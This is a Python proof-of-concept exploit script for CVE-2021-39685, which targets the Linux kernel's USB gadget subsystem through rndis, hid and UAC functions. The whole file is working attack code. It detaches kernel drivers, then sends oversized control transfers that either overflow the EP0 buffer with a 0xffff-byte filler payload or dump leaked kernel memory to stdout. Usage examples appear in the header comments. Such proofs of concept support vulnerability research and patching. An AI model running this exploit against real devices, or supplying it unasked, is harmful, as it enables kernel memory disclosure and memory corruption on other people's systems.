#!/usr/bin/python3

#
# CVE-2021-39685
#
# This sample script attempts to exploit lack
# of control transfer request wLength limiting
# by Linux kernel's USB gadget subsystem.
#
# Exploitable functions include rndis, hid,
# uac1, uac1_legacy, uac2.
#
# On the host side use a custom build of libusb
# with MAX_CTRL_BUFFER_LENGTH increased to 0xffff
# from default value of 4096.
#
# The EP0 buffer as allocated in composite.c is
# USB_COMP_EP0_BUFSIZ bytes large so everything past
# 4096 will cause buffer overflow.
#
# Use samples:
# sudo ./gadget.py -v 0x18d1 -p 0x4e23 -f rndis
# sudo ./gadget.py -v 0x1b67 -p 0x400c -f uac1 -d read
#
# This script requires pyusb.
#
# https://github.com/szymonh/inspector-gadget
#

import argparse
import sys

import usb.core
import usb.util


CTRL_REQ_MAP = {
    'uac1': {
        'read': {
            'bmRequestType': 0xa2,                # USB_DIR_IN | USB_TYPE_CLASS | USB_RECIP_ENDPOINT
            'bRequest': 129,                      # UAC_GET_CUR
            'wValue': 0x00,
            'wIndex': 0x00,
        },
        'write': {
            'bmRequestType': 0x22,                # USB_DIR_OUT | USB_TYPE_CLASS | USB_RECIP_ENDPOINT
            'bRequest': 0x01,                     # UAC_SET_CUR
            'wValue': 0x00,
            'wIndex': 0x00,
        }
    },
    'uac1_legacy': {
        'read': {
            'bmRequestType': 0xa2,                # USB_DIR_IN | USB_TYPE_CLASS | USB_RECIP_ENDPOINT
            'bRequest': 129,                      # UAC_GET_CUR
            'wValue': 0x00,
            'wIndex': 0x00,
        },
        'write': {
            'bmRequestType': 0x22,                # USB_DIR_OUT | USB_TYPE_CLASS | USB_RECIP_ENDPOINT
            'bRequest': 0x01,                     # UAC_SET_CUR
            'wValue': 0x00,
            'wIndex': 0x00,
        }
    },
    'uac2': {
        'write': {
            'bmRequestType': 0x21,                # USB_DIR_OUT | USB_TYPE_CLASS | USB_RECIP_INTERFACE
            'bRequest': 1,                        # UAC2_CS_CUR
            'wValue': (0x01 << 8),                # higher byte set to UAC2_CS_CONTROL_SAM_FREQ
            'wIndex': 0,                          # lower byte set to uac2->ac_intf, higher USB_IN_CLK_ID
        }
    },
    'rndis': {
        'write': {
            'bmRequestType': 0x21,                # USB_DIR_OUT | USB_TYPE_CLASS | USB_RECIP_INTERFACE
            'bRequest': 0x00,                     # USB_CDC_SEND_ENCAPSULATED_COMMAND
            'wValue': 0x00,                       # needs to be 0
            'wIndex': 0x00,                       # must be set to rndis->ctrl_id
        }
    },
    'hid': {
        'write': {                                # hidg->use_out_ep must be false
            'bmRequestType': 0x21,                # USB_DIR_OUT | USB_TYPE_CLASS | USB_RECIP_INTERFACE
            'bRequest': 0x09,                     # HID_REQ_SET_REPORT
            'wValue': 0x00,                       # don't care
            'wIndex': 0x00,                       # don't care
        }
    }
}


def auto_int(val: str) -> int:
    '''Convert arbitrary string to integer

    Used as argparse type to automatically handle input with
    different base - decimal, octal, hex etc.

    '''
    return int(val, 0)


def parse_args() -> argparse.Namespace:
    '''Parse command line arguments

    '''
    parser = argparse.ArgumentParser(
        description='Sample exploit for RNDIS gadget class'
    )

    parser.add_argument('-v', '--vid',  type=auto_int, required=True,
                        help='vendor id')
    parser.add_argument('-p', '--pid', type=auto_int, required=True,
                        help='product id')
    parser.add_argument('-l', '--length', type=auto_int, default=0xffff,
                        required=False, help='lenght of data to write')
    parser.add_argument('-d', '--direction', type=str, default='read',
                        choices=['read', 'write'],
                        help='direction of operation from host perspective')
    parser.add_argument('-f', '--function', type=str, default='rndis',
                        choices=('rndis', 'uac1', 'uac1_legacy', 'uac2', 'hid'))

    return parser.parse_args()


def setup_device(args: argparse.Namespace):
    '''Find and prepare the usb device

    '''
    usbdev = usb.core.find(idVendor=args.vid, idProduct=args.pid)
    if usbdev is None:
        print('Device not found, verify specified VID and PID')
        sys.exit(1)

    for cfg in usbdev:
        for idx in range(cfg.bNumInterfaces):
            if usbdev.is_kernel_driver_active(idx):
                usbdev.detach_kernel_driver(idx)
    usbdev.set_configuration()
    return usbdev


def build_payload(length: int) -> bytearray:
    '''Provide a payload to use

    This should include some nice code but for
    pure demo As should be fine.

    '''
    payload = bytearray()
    for i in range(0, length):
        payload.append(ord('A'))
    return payload


def pick_request(args: argparse.Namespace) -> dict:
    '''Choose control transfer request

    '''
    if args.direction not in CTRL_REQ_MAP[args.function]:
        args.direction = list(CTRL_REQ_MAP[args.function].keys())[0]

    ctrl_req = CTRL_REQ_MAP[args.function][args.direction]

    if args.direction == 'read':
        ctrl_req['data_or_wLength'] = args.length
    else:
        ctrl_req['data_or_wLength'] = build_payload(args.length)

    return ctrl_req


def present_response(args: argparse.Namespace, data) -> None:
    '''Present the retrieved mem contents for read

    '''
    if args.direction == 'write':
        print('Wrote {} bytes of data'.format(data))
        print('Please check the device state')
    else:
        sys.stdout.buffer.write(data)


def exploit(args: argparse.Namespace) -> None:
    '''Exploit the Gadget

    '''
    usbdev = setup_device(args)
    ctrl_req = pick_request(args)
    data = usbdev.ctrl_transfer(**ctrl_req)
    present_response(args, data)


if __name__ == '__main__':
    '''Main script

    '''
    exploit(parse_args())
